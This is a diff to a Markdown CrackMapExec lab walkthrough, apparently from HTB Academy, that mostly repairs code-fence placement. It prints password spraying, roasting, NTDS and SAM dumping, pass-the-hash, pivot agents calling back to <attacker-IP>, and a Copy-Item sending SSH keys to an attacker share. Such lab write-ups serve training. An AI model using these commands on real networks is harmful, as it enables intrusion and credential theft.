@@ -189,8 +189,8 @@ Method: we will use the same command, but we will grep for the description
 instead:
 ```bash
 crackmapexec smb <target-IP> -u '' -p '' --users | grep
-```
 'Service Account for testing'
+```
 
 
 
@@ -241,8 +241,8 @@ There are passwords mentioned in the user's description – 'alina' and
 Lets view the shares with 'testaccount' credentials:
 ```bash
 crackmapexec smb <target-IP> -u 'testaccount' -p
-```
 'Testing123!' --shares
+```
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/using-crackmapexec/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -290,8 +290,8 @@ done
 # Confirm the file has been created
 ```bash
 echo "Passwords written to $output_file"
-```
 I called the script 'inlane_maker.sh':
+```
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/using-crackmapexec/p008_01.jpg)
 *_Figure 8.1 — Lab execution and output verification (Page 8)_*
@@ -343,9 +343,9 @@ The userslist is ready, lets password spray with the password we found in the
 previous question – 'Inlanefreight02!', we will use the command:
 ```bash
 crackmapexec smb <target-IP> -u userslist.txt -p
-```
 Inlanefreight02! --continue-on-success | grep
 "STATUS_PASSWORD_MUST_CHANGE"
+```
 
 ![Figure 10.1 — Lab execution and output verification (Page 10)](/assets/images/posts/htb-academy/using-crackmapexec/p010_01.jpg)
 *_Figure 10.1 — Lab execution and output verification (Page 10)_*
@@ -370,8 +370,8 @@ Full-scale means in this case that we will take both the 'userslist.txt' and the
 to display only sucsesses:
 ```bash
 crackmapexec winrm <target-IP> -u userslist.txt -p
-```
 passwords.txt --continue-on-success | grep '[+]'
+```
 
 
 *bruteforce will take 3 to 4 minutes. *
@@ -384,14 +384,14 @@ Method: we will bruteforce the mssql server for 'userslist.txt' and
 authentication. For that we will use the following commands:
 ```bash
 crackmapexec mssql <target-IP> -u userslist.txt -p
-```
 passwords.txt --continue-on-success | grep '[+]'
+```
 and
 ```bash
 crackmapexec mssql <target-IP> -u userslist.txt -p
-```
 passwords.txt --continue-on-success --local-auth | grep
 '[+]'
+```
 
 
 There are 2 options, one is 'grace' (which was used in the example so we rule
@@ -418,8 +418,8 @@ we use the obtained 'nicole' credentials to extract the ASREPRoast
 hash, using the command:
 ```bash
 crackmapexec ldap <target-IP> -u nicole -p Inlanefreight02!
-```
 -d dc01.inlanefreight.htb --asreproast asreproast.out
+```
 
 
 There are 3 hashes. We take linda's.
@@ -495,8 +495,8 @@ Method: in the same screenshot from above we have the password as well.
 we can determine that with the following command:
 ```bash
 crackmapexec winrm <target-IP> -u diana -p
-```
 HackingGPPlike4Pro
+```
 
 
 The '[+]' means a successful login.
@@ -520,8 +520,8 @@ We will use grace credentials provided in prior sections to query user-
 descriptions:
 ```bash
 crackmapexec ldap <target-IP> -d dc01.inlanefreight.htb -u
-```
 grace -p Inlanefreight01! -M user-desc
+```
 
 
 
@@ -533,9 +533,8 @@ that there are more descriptions were saved to the file '/home/htb-ac-
 1099135/.nxc/logs/UserDesc-10.129.124.59-20240930_020905.log'
 Lets read it, filtering for the keyword 'IP':
 ```bash
-cat /home/htb-ac-1099135/.nxc/logs/UserDesc-10.129.124.59-
+cat /home/htb-ac-1099135/.nxc/logs/UserDesc-10.129.124.59-20240930_020905.log | grep IP
 ```
-20240930_020905.log | grep IP
 
 ![Figure 16.1 — Lab execution and output verification (Page 16)](/assets/images/posts/htb-academy/using-crackmapexec/p016_01.jpg)
 *_Figure 16.1 — Lab execution and output verification (Page 16)_*
@@ -558,8 +557,8 @@ looking again at the accounts mentioned on the 'Searching for
 Accounts in Group Policy Objects' section's, we check the username 'engels':
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -M mssql_priv
+```
 
 
 'engels' can attain privilege escalation by impersonate to julio.
@@ -571,9 +570,9 @@ Method: first lets try to obtain the flag using robert account without escalatin
 our privilege, lets start with retrieving the databases:
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -q "SELECT name FROM
 master.dbo.sysdatabases"
+```
 
 
 So far all good, we have the databases names, and the 'core_app' database is
@@ -593,8 +592,8 @@ included.
 
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -M mssql_priv -o ACTION=privesc
+```
 
 
 'engels' is not sysadmin!
@@ -623,8 +622,8 @@ still having our privileges escalated. Lets try to execute a simple
 command:
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -x whoami
+```
 
 
 We are in the database 'svc_mssql', and we can execute command. Lets read
@@ -645,8 +644,8 @@ the flag, using the 'type' command (as the shell is cmd-based):
 
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -x "type C:\SQL2019\sql_flag.txt"
+```
 
 
 
@@ -654,8 +653,8 @@ Inlanefreight1998! -x "type C:\SQL2019\sql_flag.txt"
 the rollback option:
 ```bash
 crackmapexec mssql <target-IP> -u engels -p
-```
 Inlanefreight1998! -M mssql_priv -o ACTION=rollback
+```
 
 
 
@@ -690,15 +689,15 @@ First, we will have to link the domain to the target IP in '/etc/hosts'
 sudo nano /etc/hosts
 ```
 and there we put:
-<target-IP> dc01.inlanefreight.htb inlanefreight.htb
+`<target-IP>` dc01.inlanefreight.htb inlanefreight.htb
 
 
 
 Once the domain and IP are linked, we will run the crackmapexec command:
 ```bash
 crackmapexec ldap dc01.inlanefreight.htb -u grace -p
-```
 'Inlanefreight01!' --kerberoasting kerberoasting.out
+```
 
 
 *
@@ -800,8 +799,8 @@ for this section we are provided with the credentials
 First lets check the shares we can access with 'grace' account:
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 shares
+```
 
 
 *
@@ -811,8 +810,8 @@ Here is the IT share. Lets take a look in it via the spider feature of
 crackmapexec:
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 spider IT --pattern txt
+```
 
 
 The file shown here but not on the section's guide example – is 'PCNames.txt'
@@ -841,8 +840,8 @@ in the previous questions we can see also the share 'Users'.
 So lets simply change the share to 'Users' in the spider-query:
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 spider Users --pattern txt
+```
 
 
 
@@ -853,8 +852,8 @@ Method: lets use 'spider_plus' to run a search on all shares (except some
 default ones):
 ```bash
 crackmapexec smb <target-IP> -u grace -p 'Inlanefreight01!'
-```
 -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
+```
 
 
 *
@@ -882,8 +881,8 @@ we will use the download flag '--get-file' and then download the
 question):
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 share Users --get-file test/powershelltest.ps1
+```
 powershelltest.ps1
 
 
@@ -925,16 +924,14 @@ Method 1: Ligolo.
 We will download Linux proxy (amd64), and Windows agent (amd64) – both
 version 6.2:
 ```bash
-wget https://github.com/nicocha30/ligolo-
-```
-ng/releases/download/v0.6.2/ligolo-
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-
 ng_proxy_0.6.2_linux_amd64.tar.gz -O proxy.gz -q;
+```
 
 ```bash
-wget https://github.com/nicocha30/ligolo-
-```
-ng/releases/download/v0.6.2/ligolo-
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-
 ng_agent_0.6.2_windows_amd64.zip -O agent.zip -q;
+```
 and confirm download
 
 
@@ -955,8 +952,8 @@ sudo ip tuntap add user <pwnbox-user> mode tun ligolo;
 sudo ip link set ligolo up;
 sudo ip route add 172.16.1.0/24 dev ligolo;
 tar -xvf proxy.gz;
-```
 ./proxy -selfcert;
+```
 
 
 *
@@ -986,15 +983,15 @@ unzip agent.zip
 
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 put-file ./agent.exe \\Windows\\Temp\\agent.exe
+```
 
 and run:
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! -x
-```
-"C:\Windows\Temp\agent.exe -connect <attacker-IP>:11601 -
+"C:\Windows\Temp\agent.exe -connect `<attacker-IP>`:11601 -
 ignore-cert"
+```
 
 
 The agent is running.
@@ -1031,8 +1028,8 @@ We have a connection!
 Lets see what shares we are in:
 ```bash
 crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --
-```
 shares
+```
 
 
 There is a share called 'flag'.
@@ -1040,8 +1037,8 @@ There is a share called 'flag'.
 Lets see what we have got on that share using the spider technique:
 ```bash
 crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --
-```
 spider flag --pattern txt
+```
 
 ![Figure 31.1 — Lab execution and output verification (Page 31)](/assets/images/posts/htb-academy/using-crackmapexec/p031_01.jpg)
 *_Figure 31.1 — Lab execution and output verification (Page 31)_*
@@ -1059,8 +1056,8 @@ spider flag --pattern txt
 There is a 'flag.txt' in that share. Lets download it and read it:
 ```bash
 crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --
-```
 share flag --get-file flag.txt flag.txt
+```
 
 ```bash
 cat flag.txt
@@ -1096,7 +1093,7 @@ client. We will use chisel version 1.7.7.
 
 Lets set the chisel server on our attacking pwnbox:
 wget
-https://github.com/jpillora/chisel/releases/download/v1.7.7/
+`https://github.com/jpillora/chisel/releases/download/v1.7.7/`
 chisel_1.7.7_linux_amd64.gz -O chisel.gz -q;
 
 gunzip -d chisel.gz;
@@ -1113,21 +1110,21 @@ The chisel server is up and running and awaiting connections.
 Now the chisel client, we will use crackmapexec smb to upload it to the target
 machine:
 wget
-https://github.com/jpillora/chisel/releases/download/v1.7.7/
+`https://github.com/jpillora/chisel/releases/download/v1.7.7/`
 chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q;
 
 gunzip -d chisel.exe.gz;
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! --
-```
 put-file ./chisel.exe \\Windows\\Temp\\chisel.exe;
+```
 
 and then execute it there:
 ```bash
 crackmapexec smb <target-IP> -u grace -p Inlanefreight01! -x
-```
-"C:\Windows\Temp\chisel.exe client <attacker-IP>:8080
+"C:\Windows\Temp\chisel.exe client `<attacker-IP>`:8080
 R:socks";
+```
 
 ![Figure 33.1 — Lab execution and output verification (Page 33)](/assets/images/posts/htb-academy/using-crackmapexec/p033_01.jpg)
 *_Figure 33.1 — Lab execution and output verification (Page 33)_*
@@ -1147,8 +1144,8 @@ Now, as we located the flag in the 'Ligolo' method – we will skip to the part 
 downloading the flag the reading it:
 ```bash
 sudo proxychains crackmapexec smb 172.16.1.10 -u grace -p
-```
 Inlanefreight01! --share flag --get-file flag.txt flag.txt;
+```
 
 ```bash
 cat flag.txt;
@@ -1183,8 +1180,8 @@ pivot to 'DC01' (we will proceed with the 'Ligolo' method) – lets review the
 shares once again:
 ```bash
 crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --
-```
 shares
+```
 
 
 We can READ & WRITE to the shares 'HR' and 'IT-Tools'.
@@ -1211,7 +1208,7 @@ Now lets run the files, we will be using the 'SERVER' and 'NAME' options:
 ```bash
 crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M
 ```
-slinky -o SERVER=<attacker-IP> NAME=important
+slinky -o SERVER=`<attacker-IP>` NAME=important
 
 
 *
@@ -1354,8 +1351,8 @@ And here is the NTLM hash of the Administrator. lets WinRM connect to
 
 ```bash
 evil-winrm -i 172.16.1.5 -u administrator -H
-```
 30b3783ce2abf1af70f77d0660cf3453
+```
 
 
 We are in! lets take the flag:
@@ -1392,8 +1389,8 @@ Now, as the hint in the question implies – service accounts might take a minut
 or 2 to initialize, so we will wait 2 minutes, and run the command:
 ```bash
 crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
-```
 -loggedon-users
+```
 
 
 
@@ -1403,8 +1400,8 @@ Answer: linux01$
 Method: we use the following command:
 ```bash
 crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
-```
 -computers
+```
 
 
 'linux01$' is the only computer which does not appears in the section's guide.
@@ -1426,8 +1423,8 @@ crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
 we use the following command:
 ```bash
 crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
-```
 -disks
+```
 
 
 'K' is the only disk which does not appears in the section's guide.
@@ -1442,8 +1439,8 @@ Answer: 3103
 Method: we will use the following command:
 ```bash
 crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
-```
 -rid-brute | grep -i flag
+```
 
 ![Figure 42.1 — Lab execution and output verification (Page 42)](/assets/images/posts/htb-academy/using-crackmapexec/p042_01.jpg)
 *_Figure 42.1 — Lab execution and output verification (Page 42)_*
@@ -1466,8 +1463,8 @@ continuing with 'robert: Inlanefreight01!' credentials from the
 previous section – we run the command:
 ```bash
 crackmapexec ldap <target-IP> -u robert -p Inlanefreight01!
-```
 --password-not-required
+```
 
 
 
@@ -1513,8 +1510,8 @@ to login to the smb server.
 First lets see to what shares 'svc_gmsa$' can access:
 ```bash
 crackmapexec smb <target-IP> -u svc_gmsa$ -H
-```
 9a143170b2acc30f09001da26c17cf38 --shares
+```
 
 ![Figure 44.1 — Lab execution and output verification (Page 44)](/assets/images/posts/htb-academy/using-crackmapexec/p044_01.jpg)
 *_Figure 44.1 — Lab execution and output verification (Page 44)_*
@@ -1531,17 +1528,17 @@ crackmapexec smb <target-IP> -u svc_gmsa$ -H
 Lets see where is the flag in there:
 ```bash
 crackmapexec smb <target-IP> -u svc_gmsa$ -H
-```
 9a143170b2acc30f09001da26c17cf38 --spider serviceaccount --
 pattern txt
+```
 
 
 Here is the flag, lets take it:
 ```bash
 crackmapexec smb <target-IP> -u svc_gmsa$ -H
-```
 9a143170b2acc30f09001da26c17cf38 --share serviceaccount --
 get-file flag.txt flag.txt
+```
 and read it:
 ```bash
 cat flag.txt
@@ -1568,8 +1565,8 @@ we will the following command to take RDP screenshot using
 'Julio:Password1' credentials:
 ```bash
 crackmapexec rdp <target-IP> -u Julio -p Password1 --
-```
 screenshot
+```
 
 
 
@@ -1598,8 +1595,8 @@ Our task is to execute commands as 'localadmin' with the password
 'Password99!' lets try to execute 'whoami' first:
 ```bash
 crackmapexec smb <target-IP> -u localadmin -p Password99! --
-```
 local-auth -x whoami
+```
 
 
 *
@@ -1611,9 +1608,9 @@ So lets use the 'Administrator' account to enable command execution, we will
 do that with the following command:
 ```bash
 crackmapexec smb <target-IP> -u Administrator -p
-```
 'AnotherC0mpl3xP4$$' --local-auth -x "reg add
 HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYST
+```
 EM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
 
 ![Figure 47.1 — Lab execution and output verification (Page 47)](/assets/images/posts/htb-academy/using-crackmapexec/p047_01.jpg)
@@ -1646,8 +1643,8 @@ Now, when the pivoting is established, lets try to run a command on 'DC01' as
 'robert':
 ```bash
 crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!'
-```
 -x whoami
+```
 
 ![Figure 48.1 — Lab execution and output verification (Page 48)](/assets/images/posts/htb-academy/using-crackmapexec/p048_01.jpg)
 *_Figure 48.1 — Lab execution and output verification (Page 48)_*
@@ -1668,16 +1665,16 @@ continuing with 'robert' credentials and the established pivoting to
 commands on 'DC01' via WinRM:
 ```bash
 crackmapexec winrm 172.16.1.10 -u robert -p
-```
 'Inlanefreight01!' -x whoami
+```
 
 
 We have an output! We can execute commands via 'WinRM'! lets take the flag:
 ```bash
 crackmapexec winrm 172.16.1.10 -u robert -p
-```
 'Inlanefreight01!' -x 'type
 C:\Users\robert\Desktop\flag.txt'
+```
 
 ![Figure 49.1 — Lab execution and output verification (Page 49)](/assets/images/posts/htb-academy/using-crackmapexec/p049_01.jpg)
 *_Figure 49.1 — Lab execution and output verification (Page 49)_*
@@ -1707,7 +1704,7 @@ sudo nano /etc/samba/smb.conf;
 ```
 and in it:
 [share]
-path = /home/<pwnbox-user>
+path = /home/`<pwnbox-user>`
 available = yes
 valid users = nobody
 read only = no
@@ -1740,10 +1737,10 @@ chmod 777 ~
 now we can make the download:
 ```bash
 crackmapexec smb <target-IP> -u Administrator -p
-```
 'AnotherC0mpl3xP4$$' --local-auth -x "powershell.exe -c
 \"Copy-Item 'C:\Users\Administrator\Desktop\julio_keys' -
-Destination '\\\\<attacker-IP>\\share\\julio_keys'\""
+Destination '\\\\`<attacker-IP>`\\share\\julio_keys'\""
+```
 
 and confirm download with
 ```bash
@@ -1756,8 +1753,8 @@ Now all we have left is to use the keys to ssh connect to julio user and obtain
 the flag:
 ```bash
 crackmapexec ssh <target-IP> -u julio --key-file julio_keys
-```
 -p "" -x 'type C:\Users\julio\Desktop\flag.txt'
+```
 
 ![Figure 51.1 — Lab execution and output verification (Page 51)](/assets/images/posts/htb-academy/using-crackmapexec/p051_01.jpg)
 *_Figure 51.1 — Lab execution and output verification (Page 51)_*
@@ -1780,8 +1777,8 @@ continuing from the previous section – we use 'robert' user
 credentials to extract the sam database from 'MS01':
 ```bash
 crackmapexec smb <target-IP> -u robert -p 'Inlanefreight01!'
-```
 --sam
+```
 *we go for the 'SAM' hashes in and not 'NTDS.dit' because we want the local
 database. *
 
@@ -1795,8 +1792,8 @@ Method: now we are seeking domain accounts, so we will extract the NTDS.dit
 database in 'DC01':
 ```bash
 crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!'
-```
 --ntds
+```
 
 ![Figure 52.1 — Lab execution and output verification (Page 52)](/assets/images/posts/htb-academy/using-crackmapexec/p052_01.jpg)
 *_Figure 52.1 — Lab execution and output verification (Page 52)_*
@@ -1820,9 +1817,8 @@ crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!'
 
 from the file of the extracted hash – lets modify a bit the command:
 ```bash
-cat /home/htb-ac-1099135/.nxc/logs/DC01_172.16.1.10_2024-10-
+cat /home/htb-ac-1099135/.nxc/logs/DC01_172.16.1.10_2024-10-01_032333.ntds | grep -i soti
 ```
-01_032333.ntds | grep -i soti
 such that we grep for 'soti' and removed the 'cut' command in order to display
 the hashes as well:
 
@@ -1851,18 +1847,18 @@ the hashes as well:
 lets use pass the hash with crackmapexec winrm to get the flag:
 ```bash
 crackmapexec winrm 172.16.1.10 -u soti -H
-```
 '1bc3af33d22c1c2baec10a32db22c72d' -x 'type
 C:\Users\soti\Desktop\flag.txt'
+```
 
 
 
 
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p ''
-```
 --rid-brute | tail -n +4 | awk '{print $6}' | cut -d '\' -f2
 > userslist.txt
+```
 
 ![Figure 54.1 — Lab execution and output verification (Page 54)](/assets/images/posts/htb-academy/using-crackmapexec/p054_01.jpg)
 *_Figure 54.1 — Lab execution and output verification (Page 54)_*
@@ -1885,8 +1881,8 @@ sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p ''
 
 ```bash
 Bloodhound Integration:
-```
 Question - Optional: Repeat the examples in the section, and mark DONE
+```
 when finished.
 Answer: DONE
 Method: **SKIPPED**
@@ -1908,8 +1904,8 @@ for this section we are provided with the credentials of
 Now, to get the DNS records we will use the command:
 ```bash
 crackmapexec ldap <target-IP> -d dc01.inlanefreight.htb -u
-```
 julio -p Password1 -M get-network -o ALL=true
+```
 
 
 There are 4 records saved to 'home/htb-ac-
@@ -1917,10 +1913,9 @@ There are 4 records saved to 'home/htb-ac-
 
 Lets look in there for 'DC02' record:
 ```bash
-cat /home/htb-ac-
-```
-1099135/.nxc/logs/dc01.inlanefreight.htb_network_2024-10-
+cat /home/htb-ac-1099135/.nxc/logs/dc01.inlanefreight.htb_network_2024-10-
 01_040752.log | grep dc02
+```
 
 ![Figure 56.1 — Lab execution and output verification (Page 56)](/assets/images/posts/htb-academy/using-crackmapexec/p056_01.jpg)
 *_Figure 56.1 — Lab execution and output verification (Page 56)_*
@@ -2017,9 +2012,9 @@ for this section we are provided with the credentials
 Now we will get the flag using command execution – we will use the command:
 ```bash
 crackmapexec smb <target-IP> -u Administrator -p
-```
 'IpreferanewP@$$' -x 'type
 C:\Users\Administrator\Desktop\flag.txt'
+```
 
 
 *
@@ -2087,11 +2082,11 @@ We have the Administrator NTLM hash.
 Now we can proceed with extracting the flag with either SMB pass the hash:
 ```bash
 crackmapexec smb 172.16.10.3 -u Administrator -H
-```
 'f36ccfe434490cddc644901973d9a344' -x 'type
 C:\Users\Administrator\Desktop\flag.txt'
 or WinRM pass the hash:
 ```bash
+```
 crackmapexec winrm 172.16.10.3 -u Administrator -H
 ```
 'f36ccfe434490cddc644901973d9a344' -x 'type
@@ -2139,9 +2134,9 @@ Question - Optional: Repeat the examples in the section, and mark DONE
 when finished.
 Answer: DONE
 Method: Lets first link the target-IP to the domain on '/etc/hosts':
-```bash
 sudo nano /etc/hosts
 ```
+```bash
 
 and in it
 
@@ -2149,7 +2144,7 @@ and in it
 
 ### shares he has access to
 
-<target-IP> dc01.inlanefreight.htb inlanefreight.htb
+`<target-IP>` dc01.inlanefreight.htb inlanefreight.htb
 
 
 
@@ -2158,15 +2153,15 @@ authentication, using Robert credentials (which we used before) to get the
 shares he has access to:
 ```bash
 crackmapexec smb <target-IP> -u robert -p Inlanefreight01! -
-```
 -kerberos --shares
+```
 
 
 
 Lets proceed to create and store Robert TGT (ticket granting ticket) to
 enviorement variable, and use to it authenticate to various services:
 getTGT.py inlanefreight.htb/robert:'Inlanefreight01!' -dc-ip
-<target-IP>
+`<target-IP>`
 
 ```bash
 export KRB5CCNAME=$(pwd)/robert.ccache
@@ -2199,8 +2194,8 @@ Authentication passed
 mssql:
 ```bash
 crackmapexec mssql dc01.inlanefreight.htb --use-kcache -q
-```
 "SELECT name FROM master.dbo.sysdatabases"
+```
 we query for dc01 databases, using the TGT:
 
 
@@ -2261,7 +2256,7 @@ just as with 'Proxychains with CME' – we add in the file the proxy 'socks 5
 Now to the chisel – now we need the chisel client only. We will download chisel
 client for Linux (and64)
 wget
-https://github.com/jpillora/chisel/releases/download/v1.7.7/
+`https://github.com/jpillora/chisel/releases/download/v1.7.7/`
 chisel_1.7.7_linux_amd64.gz -O chisel.gz -q;
 
 gunzip -d chisel.gz;
@@ -2270,7 +2265,7 @@ gunzip -d chisel.gz;
 chmod +x chisel;
 ```
 
-./chisel client <target-IP>:1080 socks;
+./chisel client `<target-IP>`:1080 socks;
 
 ![Figure 66.1 — Lab execution and output verification (Page 66)](/assets/images/posts/htb-academy/using-crackmapexec/p066_01.jpg)
 *_Figure 66.1 — Lab execution and output verification (Page 66)_*
@@ -2293,9 +2288,9 @@ chmod +x chisel;
 
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p ''
-```
 --rid-brute 10000
-*we make sure to set the –rid-brute to brute force NOT the default first 4000
+```
+*we make sure to set the --rid-brute to brute force NOT the default first 4000
 options, but to a value large enough to cover all the options. 10000 should
 suffice. *
 
@@ -2322,8 +2317,8 @@ didn't made exact count). Lets keep those users in a file:
 
 ```bash
 sudo proxychains -q crackmapexec ldap 172.16.15.3 -u
-```
 userslist.txt -p '' -d dc01.inlanefreight.local --asreproast
+```
 asreproast.out | grep '\$'
 
 
@@ -2417,8 +2412,8 @@ The password is 'hooters1' – meaning the credentials are 'Atul:hooters1'.
 Lets proceed in doing a share listing with 'Atul':
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u Atul -p
-```
 hooters1 --shares
+```
 
 
 'Atul' has read permissions to the share 'DEV' (which 'Juliette' doesn't).
@@ -2426,8 +2421,8 @@ hooters1 --shares
 Lets take a look in it – searching for txt files:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u Atul -p
-```
 hooters1 --spider DEV --pattern txt
+```
 
 
 
@@ -2446,8 +2441,8 @@ pwnbox, and read it:
 
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u Atul -p
-```
 hooters1 --share DEV --get-file sql_dev_creds.txt
+```
 sql_dev_creds.txt;
 
 ```bash
@@ -2466,9 +2461,9 @@ based.
 'Juliette' or 'Atul'. *
 ```bash
 sudo proxychains -q crackmapexec mssql 172.16.15.15 -u
-```
 'sqldev' -p 'Sq!D3vUs3R' -M mssql_priv -o ACTION=privesc --
 local-auth
+```
 
 
 'sqldev' can impersonate 'netdb'.
@@ -2476,9 +2471,9 @@ local-auth
 Now we can run commands on the 'SQL01' host. Lets take the flag:
 ```bash
 sudo proxychains -q crackmapexec mssql 172.16.15.15 -u
-```
 'sqldev' -p 'Sq!D3vUs3R' -x 'type C:\Users\Public\flag.txt'
 --local-auth
+```
 
 ![Figure 73.1 — Lab execution and output verification (Page 73)](/assets/images/posts/htb-academy/using-crackmapexec/p073_01.jpg)
 *_Figure 73.1 — Lab execution and output verification (Page 73)_*
@@ -2501,25 +2496,25 @@ lets use 'sqldev' to take a look at 'SQL01' database, we will begin with
 enumerating the databases in that host:
 ```bash
 sudo proxychains -q crackmapexec mssql 172.16.15.15 -u
-```
 'sqldev' -p 'Sq!D3vUs3R' -q "SELECT name FROM
 master.dbo.sysdatabases" --local-auth
+```
 
 
 We have this 'interns' database. Lets see what tables are in it:
 ```bash
 sudo proxychains -q crackmapexec mssql 172.16.15.15 -u
-```
 'sqldev' -p 'Sq!D3vUs3R' -q "SELECT table_name from
 interns.INFORMATION_SCHEMA.TABLES" --local-auth
+```
 
 
 'interns' database has a table 'details'. Lets read everything in this table:
 ```bash
 sudo proxychains -q crackmapexec mssql 172.16.15.15 -u
-```
 'sqldev' -p 'Sq!D3vUs3R' -q "SELECT * from
 [interns].[dbo].details" --local-auth
+```
 
 ![Figure 74.1 — Lab execution and output verification (Page 74)](/assets/images/posts/htb-academy/using-crackmapexec/p074_01.jpg)
 *_Figure 74.1 — Lab execution and output verification (Page 74)_*
@@ -2575,8 +2570,8 @@ we call it 'interns.sh':
 Lets give it execution permissions, and run it:
 ```bash
 chmod u+x interns.sh;
-```
 ./interns.sh;
+```
 
 
 Lets check the output file 'interns.txt':
@@ -2590,8 +2585,8 @@ intern is a valid user in this host, using 'password spray' technique with the
 password 'Welcome1':
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u
-```
 interns.txt -p Welcome1 | grep '[+]'
+```
 
 
 'intern30' is a valid user of 'DC01'.
@@ -2599,8 +2594,8 @@ interns.txt -p Welcome1 | grep '[+]'
 Lets see what shares 'intern30' can access in 'DC01':
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u intern30
-```
 -p Welcome1 --shares
+```
 
 ![Figure 76.1 — Lab execution and output verification (Page 76)](/assets/images/posts/htb-academy/using-crackmapexec/p076_01.jpg)
 *_Figure 76.1 — Lab execution and output verification (Page 76)_*
@@ -2658,8 +2653,8 @@ Now as the responder is listening, lets drop the 'agent' – 'searchConnector-ms
 file:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u intern30
-```
 -p Welcome1 -M drop-sc -o URL=\\\\<attacker-IP>\\secret
+```
 SHARE=DEV_INTERN FILENAME=secret
 
 ![Figure 78.1 — Lab execution and output verification (Page 78)](/assets/images/posts/htb-academy/using-crackmapexec/p078_01.jpg)
@@ -2698,8 +2693,8 @@ With james's credentials – we can check for GMSA – 'Group Managed Service
 Account'. Lets check for those in 'DC01':
 ```bash
 sudo proxychains -q crackmapexec ldap 172.16.15.3 -u james -
-```
 p 04apple --gmsa
+```
 
 ![Figure 79.1 — Lab execution and output verification (Page 79)](/assets/images/posts/htb-academy/using-crackmapexec/p079_01.jpg)
 *_Figure 79.1 — Lab execution and output verification (Page 79)_*
@@ -2728,8 +2723,8 @@ using 'svc_devadm$' user – lets run shares enumeration to 'DEV01' to
 see to what shares the user has access to:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u
-```
 svc_devadm$ -H 02f9f62c9512a096d9d0873a203fa0a4 --shares
+```
 
 
 'svc_devadm$' has READ and WRITE access to both 'C$' and 'Admin$' shares.
@@ -2749,8 +2744,8 @@ see what we can find:
 
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u
-```
 svc_devadm$ -H '02f9f62c9512a096d9d0873a203fa0a4' --spider
+```
 C$ --pattern txt
 
 
@@ -2759,8 +2754,8 @@ There seems to be the presence of 'KeePass' in the host.
 Lets see what we can find in there using the 'keepass_discover' module:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u
-```
 svc_devadm$ -H '02f9f62c9512a096d9d0873a203fa0a4' -M
+```
 keepass_discover
 
 
@@ -2769,8 +2764,8 @@ We've found 'Roaming\KeePass\KeePass.config.xml' file
 Lets extract whatever data we can from it:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u
-```
 svc_devadm$ -H '02f9f62c9512a096d9d0873a203fa0a4' -M
+```
 keepass_trigger -o ACTION=ADD
 KEEPASS_CONFIG_PATH=C:/Users/Administrator/AppData/Roaming/K
 eePass/KeePass.config.xml
@@ -2789,8 +2784,8 @@ eePass/KeePass.config.xml
 →
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u
-```
 svc_devadm$ -H '02f9f62c9512a096d9d0873a203fa0a4' -M
+```
 keepass_trigger -o ACTION=POLL
 
 
@@ -2827,9 +2822,9 @@ spraying. We will be using the 'userslist.txt' created back in the first questio
 generated with the command
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u james -p
-```
 04apple --users | tail -n +5 | awk '{print $5}' >
 userslist.txt
+```
 using the fact 'james' has access to the '--users' list in 'DC01'.
 It is actually more recommended as it produces far less usernames than the '--
 rid-brute'. However, both methods will work*
@@ -2837,8 +2832,8 @@ rid-brute'. However, both methods will work*
 Lets spray:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u
-```
 userslist.txt -p 'ASU934as0-dm23asd!' | grep '[+]'
